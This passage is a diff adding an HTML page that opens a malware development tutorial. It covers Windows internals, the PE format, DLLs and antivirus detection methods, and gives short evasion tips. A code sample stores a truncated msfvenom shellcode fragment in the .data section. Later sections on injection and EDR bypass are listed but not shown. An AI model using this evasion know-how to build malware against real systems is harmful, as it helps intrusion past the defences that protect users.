@@ -1,0 +1,1348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Malware Development — QA210</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<style>
+:root{--bg:#0a0e17;--bg2:#111827;--card:#151d2e;--border:#1e293b;--fg:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;--accent2:#818cf8;--red:#f87171;--green:#4ade80;--yellow:#facc15;--orange:#fb923c;--pink:#f472b6;--font:'Segoe UI',system-ui,-apple-system,sans-serif;--mono:'Cascadia Code','Fira Code','JetBrains Mono',Consolas,monospace;--radius:8px;--shadow:0 4px 24px rgba(0,0,0,.45);--glow:0 0 30px rgba(56,189,248,.12);--yellow-accent:#facc15}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font);background:var(--bg);color:var(--fg);line-height:1.75;min-height:100vh;overflow-x:hidden}
+#bg-canvas{position:fixed;inset:0;z-index:-1;opacity:.3}
+
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.breadcrumbs{font-size:.75rem;color:var(--muted);margin-right:auto;margin-left:24px}
+.breadcrumbs a{color:var(--muted);text-decoration:none}.breadcrumbs a:hover{color:var(--accent)}
+.breadcrumbs span{color:var(--accent)}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+
+.page-wrap{display:flex;max-width:1440px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc{position:sticky;top:56px;width:260px;min-width:260px;height:calc(100vh - 56px);overflow-y:auto;padding:20px 14px;border-right:1px solid var(--border);background:rgba(10,14,23,.85);backdrop-filter:blur(12px);scrollbar-width:thin;scrollbar-color:var(--border) transparent}
+.toc h3{font-size:.68rem;text-transform:uppercase;letter-spacing:2px;color:var(--accent);margin-bottom:10px}
+.toc a{display:block;font-size:.76rem;color:var(--muted);text-decoration:none;padding:3px 0 3px 12px;border-left:2px solid transparent;transition:all .2s}
+.toc a:hover,.toc a.active{color:var(--fg);border-left-color:var(--accent);background:rgba(56,189,248,.06)}
+.toc .toc-sub{padding-left:24px;font-size:.7rem}
+.main{flex:1;padding:36px 48px 80px;max-width:900px}
+
+.hero{text-align:center;padding:48px 0 36px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero .badge{display:inline-block;background:linear-gradient(135deg,var(--red),var(--orange));color:#fff;font-size:.62rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;padding:4px 14px;border-radius:20px;margin-bottom:14px}
+.hero h1{font-size:2.2rem;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--accent2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:8px}
+.hero .sub{font-size:1rem;color:var(--muted);margin-bottom:20px}
+.hero .meta-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.hero .meta-box{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:12px 6px;text-align:center}
+.meta-box .val{font-size:1.3rem;font-weight:700;color:var(--accent)}
+.meta-box .lbl{font-size:.62rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-top:2px}
+
+.attack-path{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:24px;margin:28px 0;overflow-x:auto}
+.attack-path h3{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--accent);margin-bottom:14px;text-align:center}
+.path-flow{display:flex;align-items:center;justify-content:center;gap:5px;flex-wrap:wrap}
+.path-node{background:linear-gradient(135deg,rgba(56,189,248,.12),rgba(129,140,248,.12));border:1px solid var(--accent);border-radius:6px;padding:7px 12px;font-size:.7rem;font-weight:600;color:var(--fg);white-space:nowrap;transition:all .25s}
+.path-node:hover{background:linear-gradient(135deg,rgba(56,189,248,.25),rgba(129,140,248,.25));transform:translateY(-2px);box-shadow:var(--glow)}
+.path-arrow{color:var(--accent);font-size:1rem;flex-shrink:0}
+
+.section{margin-bottom:44px}
+.section h2{font-size:1.5rem;font-weight:700;margin-bottom:18px;padding-bottom:8px;border-bottom:2px solid var(--accent);display:flex;align-items:center;gap:10px}
+.section h2 .icon{font-size:1.2rem}
+.section h3{font-size:1.1rem;font-weight:600;margin:26px 0 12px;color:var(--accent2)}
+.section h4{font-size:.92rem;font-weight:600;margin:18px 0 8px;color:var(--accent)}
+.section p{margin-bottom:13px;color:var(--fg)}
+.section ul,.section ol{margin:10px 0 16px 24px}
+.section li{margin-bottom:6px;color:var(--fg)}
+
+.callout{border-radius:var(--radius);padding:14px 18px;margin:18px 0;border-left:4px solid;font-size:.88rem}
+.callout p{margin-bottom:7px}.callout p:last-child{margin-bottom:0}
+.callout-info{background:rgba(56,189,248,.08);border-color:var(--accent)}
+.callout-warn{background:rgba(250,204,21,.08);border-color:var(--yellow)}
+.callout-danger{background:rgba(248,113,113,.08);border-color:var(--red)}
+.callout-success{background:rgba(74,222,128,.08);border-color:var(--green)}
+.callout-hint{background:rgba(129,140,248,.08);border-color:var(--accent2)}
+.callout-deadend{background:rgba(251,146,60,.06);border-color:var(--orange)}
+.callout-title{font-weight:700;font-size:.76rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:5px}
+.callout-info .callout-title{color:var(--accent)}.callout-warn .callout-title{color:var(--yellow)}
+.callout-danger .callout-title{color:var(--red)}.callout-success .callout-title{color:var(--green)}
+.callout-hint .callout-title{color:var(--accent2)}.callout-deadend .callout-title{color:var(--orange)}
+
+.code-block{position:relative;margin:14px 0;border-radius:var(--radius);overflow:hidden;border:1px solid var(--border)}
+.code-block .code-header{display:flex;align-items:center;justify-content:space-between;background:#1a1f2e;padding:5px 12px;font-size:.68rem;color:var(--muted)}
+.code-block .code-header .lang-tag{font-weight:600;text-transform:uppercase;letter-spacing:1px;color:var(--accent)}
+.code-block pre{margin:0!important;padding:14px!important;font-size:.8rem!important;line-height:1.6!important;background:#0d1117!important}
+.code-block code{font-family:var(--mono)!important;font-size:.8rem!important}
+.copy-btn{background:transparent;border:1px solid var(--border);color:var(--muted);font-size:.63rem;padding:2px 8px;border-radius:4px;cursor:pointer;transition:all .2s}
+.copy-btn:hover{color:var(--fg);border-color:var(--accent)}
+
+.mitre-badge{display:inline-block;background:rgba(244,114,182,.1);border:1px solid rgba(244,114,182,.25);color:var(--pink);font-size:.63rem;font-weight:600;padding:2px 7px;border-radius:4px;margin:2px;font-family:var(--mono)}
+.data-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:.83rem}
+.data-table th{background:var(--card);padding:9px 12px;text-align:left;font-size:.68rem;text-transform:uppercase;letter-spacing:1px;color:var(--accent);border-bottom:2px solid var(--border)}
+.data-table td{padding:9px 12px;border-bottom:1px solid var(--border);color:var(--fg)}
+.data-table tr:hover td{background:rgba(56,189,248,.04)}
+.data-table code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+
+.flag-box{background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,211,238,.08));border:1px solid rgba(74,222,128,.25);border-radius:var(--radius);padding:12px 18px;margin:14px 0;display:flex;align-items:center;gap:12px}
+.flag-box .flag-icon{font-size:1.2rem}.flag-box .flag-name{font-weight:700;color:var(--green);font-size:.83rem;font-family:var(--mono)}.flag-box .flag-detail{font-size:.78rem;color:var(--muted)}
+.network-diagram{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:22px;margin:22px 0;font-family:var(--mono);font-size:.66rem;line-height:1.35;color:var(--muted);overflow-x:auto;white-space:pre}
+.term-out{background:#0c0c0c;border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin:12px 0;font-family:var(--mono);font-size:.74rem;line-height:1.5;color:#ccc;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+.term-out .prompt{color:var(--accent)}.term-out .err{color:var(--red)}.term-out .ok{color:var(--green)}.term-out .warn{color:var(--yellow)}.term-out .muted{color:#666}
+.operator-sig{text-align:center;padding:28px 0;border-top:1px solid var(--border);margin-top:44px}
+.operator-sig .handle{font-size:1.1rem;font-weight:700;background:linear-gradient(135deg,var(--accent),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.operator-sig .tagline{font-size:.76rem;color:var(--muted);margin-top:4px}
+.topic-card{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 22px;margin:14px 0}
+.topic-card .tc-title{font-size:.92rem;font-weight:700;color:var(--accent);margin-bottom:8px}
+.topic-card .tc-desc{font-size:.85rem;color:var(--muted);margin-bottom:8px}
+.topic-card code{font-family:var(--mono);font-size:.78rem;color:var(--accent)}
+
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+
+@media(max-width:960px){
+.toc{display:none}
+.main{padding:20px 18px 60px}
+.hero h1{font-size:1.5rem}
+.hero .meta-grid{grid-template-columns:repeat(2,1fr)}
+.path-flow{flex-direction:column}.path-arrow{transform:rotate(90deg)}
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+.breadcrumbs{display:none}
+}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--muted)}
+</style>
+</head>
+<body>
+
+<canvas id="bg-canvas"></canvas>
+
+<header class="site-header">
+  <a href="/" class="brand">
+    <span class="logo-icon">Q</span>
+    QA210<span class="cursor"></span>
+  </a>
+  <div class="breadcrumbs">
+    <a href="/">Home</a> &rsaquo; <a href="/mal-dev/">Malware Dev</a> &rsaquo; <span>Basic</span>
+  </div>
+  <nav class="nav-main">
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/" class="active">Malware Dev</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <a href="https://w4llz.me/" target="_blank" class="social-link" title="W4LLZ Team" style="color:var(--yellow-accent)"><i class="bi bi-people-fill"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a>
+    <a href="/htb/">Hack The Box</a>
+    <a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a>
+    <a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a>
+    <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+    <a href="https://w4llz.me/" target="_blank">W4LLZ Team</a>
+  </nav>
+</div>
+
+<div class="page-wrap">
+
+<nav class="toc" id="toc">
+  <h3>Table of Contents</h3>
+  <a href="#overview">Overview</a>
+  <a href="#fundamentals">Foundational Knowledge</a>
+  <a class="toc-sub" href="#windows-arch">Windows Architecture</a>
+  <a class="toc-sub" href="#windows-api">Windows API</a>
+  <a class="toc-sub" href="#pe-format">PE Format</a>
+  <a class="toc-sub" href="#dll">DLL</a>
+  <a class="toc-sub" href="#av-detection">AV Detection Mechanisms</a>
+  <a href="#payload-placement">Payload Placement</a>
+  <a href="#payload-encryption">Payload Encryption</a>
+  <a class="toc-sub" href="#xor-enc">XOR Encryption</a>
+  <a class="toc-sub" href="#rc4-enc">RC4</a>
+  <a class="toc-sub" href="#aes-enc">AES</a>
+  <a href="#payload-obfuscation">Payload Obfuscation</a>
+  <a class="toc-sub" href="#ip-fuscation">IPv4/IPv6 Fuscation</a>
+  <a class="toc-sub" href="#mac-fuscation">MAC Fuscation</a>
+  <a class="toc-sub" href="#uuid-fuscation">UUID Fuscation</a>
+  <a href="#local-exec">Local Payload Execution</a>
+  <a class="toc-sub" href="#shellcode-inject">Shellcode Injection</a>
+  <a class="toc-sub" href="#dll-inject">DLL Injection</a>
+  <a href="#staging">Staging</a>
+  <a href="#thread-hijacking">Thread Hijacking</a>
+  <a href="#apc-injection">APC Injection</a>
+  <a href="#callback-exec">Callback Code Execution</a>
+  <a href="#mapping-injection">Mapping Injection</a>
+  <a href="#function-stomping">Function Stomping</a>
+  <a href="#spoofing">Spoofing</a>
+  <a href="#string-hashing">String Hashing</a>
+  <a href="#iat-hiding">IAT Hiding &amp; Obfuscation</a>
+  <a href="#api-hooking">API Hooking</a>
+  <a href="#syscalls">Syscalls</a>
+  <a class="toc-sub" href="#syswhispers">SysWhispers</a>
+  <a class="toc-sub" href="#hells-gate">Hell's Gate</a>
+  <a href="#anti-analysis">Anti-Analysis</a>
+  <a href="#anti-vm">Anti-Virtual Environments</a>
+  <a href="#edr-bypass">EDR Bypass &amp; NTDLL Unhooking</a>
+  <a href="#indirect-syscalls">Indirect Syscalls</a>
+  <a href="#av-bypass">Bypassing AVs</a>
+  <a href="#reference">References</a>
+</nav>
+
+<div class="main">
+
+<section class="hero">
+  <span class="badge">Malware Development Research</span>
+  <h1>Malware Development<br>Fundamentals</h1>
+  <p class="sub">QA210 &mdash; From Windows API foundations to advanced EDR bypass techniques</p>
+  <div class="meta-grid">
+    <div class="meta-box"><div class="val">33</div><div class="lbl">Topics</div></div>
+    <div class="meta-box"><div class="val">C</div><div class="lbl">Language</div></div>
+    <div class="meta-box"><div class="val">Win32</div><div class="lbl">Platform</div></div>
+    <div class="meta-box"><div class="val">x64</div><div class="lbl">Architecture</div></div>
+  </div>
+</section>
+
+<div class="attack-path">
+  <h3>Malware Development Lifecycle (MDLC)</h3>
+  <div class="path-flow">
+    <div class="path-node">Development<br><small>Build &amp; refine</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Testing<br><small>Bug hunting</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Offline AV/EDR<br><small>Local testing</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Online AV/EDR<br><small>Cloud testing</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">IoC Analysis<br><small>Indicators</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Loop Back<br><small>Step 1</small></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 1 — OVERVIEW          -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="overview">
+  <h2><i class="bi bi-info-circle"></i> Overview</h2>
+  <p>Malware is software specifically designed to carry out malicious actions such as unauthorized access to a computer or stealing sensitive data. The term "malware" is often associated with illegal or criminal activity, but it can also be used by ethical hackers such as penetration testers and red team members during authorized security assessments of an organization.</p>
+  <p>From an offensive security perspective, testers typically have three main options when it comes to the types of tools used in an assessment: Open-Source Tools (OSTs) &mdash; which are quickly identified by security vendors; purchasing commercial tools &mdash; closed-source, with a better chance of bypassing security solutions; or developing custom tools &mdash; which have not been analyzed or identified by security vendors, providing the greatest advantage for the attacking team. This is why knowledge of malware development is crucial for a successful offensive security assessment.</p>
+
+  <h3>Why Choose C?</h3>
+  <p>Any programming language can be used to create malware &mdash; Python, PowerShell, C#, C++, Go. However, C stands out for the following reasons: low-level languages are harder to reverse engineer; they do not require prerequisites on the target system (unlike Python, which needs an interpreter); the resulting file size is compact; and they provide fine-grained control when interacting with the operating system. High-level languages are more abstracted from the OS, less efficient with memory, and offer less overall control due to the abstraction of complex functionality. In contrast, low-level languages like C provide a way to interact with the operating system at a detailed level and give developers more freedom when working with the system.</p>
+
+  <h3>Malware Development Lifecycle (MDLC)</h3>
+  <p>The Malware Development Lifecycle (MDLC) is a customized version of the SDLC, consisting of 5 main phases: <strong>Development</strong> &mdash; start building or refining functionality; <strong>Testing</strong> &mdash; perform testing to detect bugs; <strong>Offline AV/EDR Testing</strong> &mdash; run the developed malware against as many security products as possible offline; <strong>Online AV/EDR Testing</strong> &mdash; run against cloud-connected security products; and <strong>IoC Analysis</strong> &mdash; analyze the malware and extract Indicators of Compromise. After step 5, the process loops back to step 1 for continuous improvement.</p>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Warning</div>
+    <p>Online AV/EDR testing may result in your malware being submitted to security vendors and added to their databases. Always test offline first, and exercise caution when testing online.</p>
+  </div>
+
+  <h3>Required Tools</h3>
+  <table class="data-table">
+    <thead><tr><th>Tool</th><th>Purpose</th></tr></thead>
+    <tbody>
+      <tr><td><code>Visual Studio</code></td><td>Primary C/C++ development environment</td></tr>
+      <tr><td><code>x64dbg</code></td><td>Open-source debugger for Windows x64/x86 binaries</td></tr>
+      <tr><td><code>PE-Bear</code></td><td>PE structure analysis, view imports/exports</td></tr>
+      <tr><td><code>Process Hacker 2</code></td><td>View and control processes, loaded DLLs, memory regions</td></tr>
+      <tr><td><code>Msfvenom</code></td><td>Shellcode payload generation</td></tr>
+      <tr><td><code>VMware / VirtualBox</code></td><td>Virtualization environment for testing</td></tr>
+      <tr><td><code>Windows SDK</code></td><td>Windows development headers and libraries</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 2 — FOUNDATIONAL      -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="fundamentals">
+  <h2><i class="bi bi-book"></i> Foundational Knowledge</h2>
+
+  <h3 id="windows-arch">Windows Architecture</h3>
+  <p>A processor in the Windows operating system can operate in two different modes: <strong>User Mode</strong> and <strong>Kernel Mode</strong>. Applications run in user mode and operating system components run in kernel mode. When an application wants to perform a task such as creating a file, it cannot do so directly &mdash; the only entity that can complete the task is the kernel, so applications must follow a process called the Function Call Flow (FCF).</p>
+  <p>The main components in the Windows architecture include: <strong>User Processes</strong> &mdash; programs executed by the user (Notepad, Chrome); <strong>Subsystem DLLs</strong> &mdash; DLLs containing API functions called by user processes (kernel32.dll, user32.dll, advapi32.dll); <strong>Ntdll.dll</strong> &mdash; a system-wide DLL at the lowest layer of user mode that creates the transition from user mode to kernel mode (commonly referred to as the Native API or NTAPI); and <strong>Executive Kernel</strong> &mdash; the Windows Kernel that calls drivers and other modules in kernel mode.</p>
+
+  <h4>Function Call Flow (FCF)</h4>
+  <p>The FCF process begins when a user application calls a WinAPI function (e.g., <code>CreateFile</code> in kernel32.dll). This DLL then calls the equivalent NTAPI function (<code>NtCreateFile</code> in ntdll.dll). Next, ntdll.dll executes an assembly instruction (sysenter on x86 or syscall on x64) to transition to kernel mode. In kernel mode, the NtCreateFile function is called, which interacts with drivers and modules to complete the work.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Direct NTAPI Invocation</div>
+    <p>Applications can call NTAPI functions (functions in NTDLL) directly without going through the WinAPI. The WinAPI is simply a wrapper layer for the Native API. However, using the Native API is more difficult because it is not officially documented by Microsoft (undocumented).</p>
+  </div>
+
+  <h4>Virtual Memory &amp; Paging</h4>
+  <p>In modern operating systems, memory is not mapped directly to physical RAM. Instead, processes use virtual memory addresses that are mapped to physical addresses. Virtual memory is based on the concept of Memory paging &mdash; memory is divided into "pages" of 4KB each. A page can be in one of several states: <code>Free</code> (no data, ready for use), <code>Reserved</code> (set aside for a specific purpose but no data yet), or <code>Committed</code> (assigned to an actual physical memory region).</p>
+  <p>Important page protection options: <code>PAGE_NOACCESS</code> (disables all access to the page), <code>PAGE_EXECUTE_READWRITE</code> (allows read, write, and execute &mdash; highly discouraged), <code>PAGE_READONLY</code> (allows read-only access).</p>
+
+  <h4>Memory Protection</h4>
+  <p>Two important memory protection mechanisms: <strong>DEP (Data Execution Prevention)</strong> &mdash; prevents code execution in memory regions that do not have the execute flag; and <strong>ASLR (Address Space Layout Randomization)</strong> &mdash; randomly arranges the address space positions of key data areas, including the base of the executable and the positions of the stack, heap, and libraries.</p>
+
+  <h3 id="windows-api">Windows API</h3>
+  <p>The Windows API provides many specialized data types beyond common ones like int and float. Key data types include:</p>
+
+  <table class="data-table">
+    <thead><tr><th>Data Type</th><th>Description</th><th>Example</th></tr></thead>
+    <tbody>
+      <tr><td><code>HANDLE</code></td><td>Handle to an object (file, process, event)</td><td><code>HANDLE hFile = CreateFile(...)</code></td></tr>
+      <tr><td><code>DWORD</code></td><td>Unsigned 32-bit integer</td><td><code>DWORD dwBytesRead;</code></td></tr>
+      <tr><td><code>LPVOID</code></td><td>Pointer to any type</td><td><code>LPVOID pMemory = VirtualAlloc(...)</code></td></tr>
+      <tr><td><code>LPSTR / LPWSTR</code></td><td>ANSI / Unicode string pointer</td><td><code>LPSTR buf = "Hello";</code></td></tr>
+      <tr><td><code>BOOL</code></td><td>Represents TRUE or FALSE</td><td><code>BOOL bResult = DeleteFile(...)</code></td></tr>
+      <tr><td><code>HMODULE</code></td><td>Handle to a module (DLL/EXE)</td><td><code>HMODULE hMod = GetModuleHandle(...)</code></td></tr>
+    </tbody>
+  </table>
+
+  <h4>ANSI vs Unicode</h4>
+  <p>Most Windows API functions have two versions ending in "A" (ANSI) or "W" (Wide/Unicode). For example: <code>CreateFileA</code> takes <code>LPCSTR</code> (ANSI 8-bit string), <code>CreateFileW</code> takes <code>LPCWSTR</code> (Unicode 16-bit string). Note the different byte sizes: <code>char str[] = "qa210"</code> takes 6 bytes, <code>wchar_t str[] = L"qa210"</code> takes 12 bytes (2 bytes per character).</p>
+
+  <h4>In/Out Parameters &amp; Error Handling</h4>
+  <p>The Windows API uses IN (input) and OUT (output) parameters. OUT parameters are typically passed by pointer. For error handling, use <code>GetLastError()</code> for WinAPI and <code>NTSTATUS</code> with the <code>NT_SUCCESS()</code> macro for NTAPI. Always check return values when calling WinAPI &mdash; for example, <code>CreateFileW</code> returns <code>INVALID_HANDLE_VALUE</code> on failure.</p>
+
+  <h3 id="pe-format">Portable Executable (PE) Format</h3>
+  <p>PE is the executable file format on Windows, including EXE, DLL, and SYS. Understanding PE structure is a critical foundation for malware development because it allows you to understand how malware is loaded into memory, how imports/exports work, and how to perform injection techniques.</p>
+
+  <div class="network-diagram">+======================================================+
+|                   PE Structure                        |
++======================================================+
+|  DOS Header (IMAGE_DOS_HEADER)                        |
+|    +-- e_magic: "MZ"                                  |
+|    +-- e_lfanew -> offset to NT Headers               |
++------------------------------------------------------+
+|  DOS Stub                                             |
++------------------------------------------------------+
+|  NT Header (IMAGE_NT_HEADERS)                         |
+|    +-- Signature: "PE\0\0"                            |
+|    +-- File Header (IMAGE_FILE_HEADER)                |
+|    |     +-- Machine, NumberOfSections                |
+|    |     +-- SizeOfOptionalHeader                     |
+|    +-- Optional Header (IMAGE_OPTIONAL_HEADER)        |
+|         +-- AddressOfEntryPoint                       |
+|         +-- ImageBase                                 |
+|         +-- SectionAlignment / FileAlignment          |
+|         +-- DataDirectory[16]                         |
+|              +-- [0] Export Table                      |
+|              +-- [1] Import Table (IAT)                |
+|              +-- [2] Resource Table                    |
+|              +-- ...                                   |
++------------------------------------------------------+
+|  Section Headers                                      |
+|    +-- .text    (code, IMAGE_SCN_MEM_EXECUTE)         |
+|    +-- .data    (global/static init vars, R/W)        |
+|    +-- .rdata   (read-only data, const)               |
+|    +-- .rsrc    (resources)                           |
+|    +-- .reloc   (relocations)                         |
++======================================================+</div>
+
+  <p>Important PE components: <strong>DOS Header</strong> starts with the magic "MZ" (0x5A4D) and contains <code>e_lfanew</code> &mdash; the offset to NT Headers; <strong>File Header</strong> contains machine info, number of sections, and timestamp; <strong>Optional Header</strong> contains <code>AddressOfEntryPoint</code> (entry point), <code>ImageBase</code> (base address), and <code>DataDirectory</code> &mdash; an array of 16 entries pointing to important data tables like Export Table, Import Table, and Resource Table.</p>
+
+  <h3 id="dll">Dynamic-Link Library (DLL)</h3>
+  <p>A DLL is a library containing code and data that can be used by multiple programs simultaneously. DLLs have an entry point <code>DllMain</code> that is called when the DLL is loaded/unloaded:</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            // Runs when DLL is loaded into a process
+            break;
+        case DLL_THREAD_ATTACH:
+            // Runs when a new thread is created
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+        case DLL_PROCESS_DETACH:
+            // Runs when DLL is unloaded
+            break;
+    }
+    return TRUE;
+}</code></pre>
+  </div>
+
+  <p>To export a function from a DLL, use <code>__declspec(dllexport)</code>. There are two ways to load a DLL: <strong>Load-time dynamic linking</strong> (linked at compile time using a <code>.lib</code> file) and <strong>Run-time dynamic linking</strong> (linked at runtime using <code>LoadLibraryA/W</code> + <code>GetProcAddress</code>). Run-time linking is more common in malware because it does not leave traces in the IAT at compile time.</p>
+
+  <h3 id="av-detection">AV Malware Detection Mechanisms</h3>
+  <p>Understanding how AV detects malware is the foundation for building bypass techniques. The main mechanisms include:</p>
+
+  <div class="topic-card">
+    <div class="tc-title">Static / Signature Detection</div>
+    <div class="tc-desc">AV matches the program against a list of known rules (YARA rules). A signature is a sequence of bytes or strings that uniquely identifies malware. For example: shellcode starting with <code>FC 48 83 E4 F0 E8 C0 00 00 00</code> can be identified as an msfvenom payload. Bypass: avoid hardcoding values, encrypt payloads, retrieve values dynamically.</div>
+  </div>
+  <div class="topic-card">
+    <div class="tc-title">Hashing Detection</div>
+    <div class="tc-desc">AV stores hash values (MD5, SHA256) of known malware in a database. Bypass is extremely simple: changing even a single byte in the file will completely change the hash value.</div>
+  </div>
+  <div class="topic-card">
+    <div class="tc-title">Heuristic Detection</div>
+    <div class="tc-desc">Experience-based detection, including: Static Heuristics (decompile and compare code against known malware) and Dynamic Heuristics (run in a sandbox and analyze suspicious behavior). More complex to bypass than simple signature detection.</div>
+  </div>
+  <div class="topic-card">
+    <div class="tc-title">Sandbox / Behavior-based Detection</div>
+    <div class="tc-desc">Sandbox analysis examines file behavior during execution in an isolated environment. Behavior-based monitoring looks for suspicious indicators while malware is running &mdash; loading DLLs, calling specific APIs, connecting to the internet. Example: allocating memory + downloading shellcode + writing to memory + executing in sequence = malicious behavior.</div>
+  </div>
+  <div class="topic-card">
+    <div class="tc-title">API Hooking &amp; IAT Checking</div>
+    <div class="tc-desc">EDRs use API hooking to intercept and analyze parameters of commonly abused APIs in real time. IAT Checking: AV examines the Import Address Table to determine which APIs a program uses &mdash; for example, seeing CreateFileA + CryptHashData may flag the program as potential ransomware.</div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 3 — PAYLOAD PLACEMENT -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="payload-placement">
+  <h2><i class="bi bi-database"></i> Payload Placement</h2>
+  <p>As a malware developer, you have several choices for where to store the payload within a PE file. Depending on this choice, the payload will reside in a different section of the PE file, affecting read/write capabilities and the level of detection by AV.</p>
+
+  <h3>.data Section</h3>
+  <p>The <code>.data</code> section contains initialized global and static variables. This section is readable and writable (R/W), making it suitable for encrypted payloads that need to be decrypted at runtime. Payloads stored in global or local variables will be placed in .data depending on compiler settings.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">c</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-c">// .data saved payload - read/write, suitable for encrypted payloads
+unsigned char Data_RawData[] = {
+    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00,
+    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2
+    // ... msfvenom shellcode
+};
+
+int main() {
+    printf("[i] Data_RawData var : 0x%p \n", Data_RawData);
+    // Can modify directly since .data is R/W
+    return 0;
+}</code></pre>
+  </div>
+
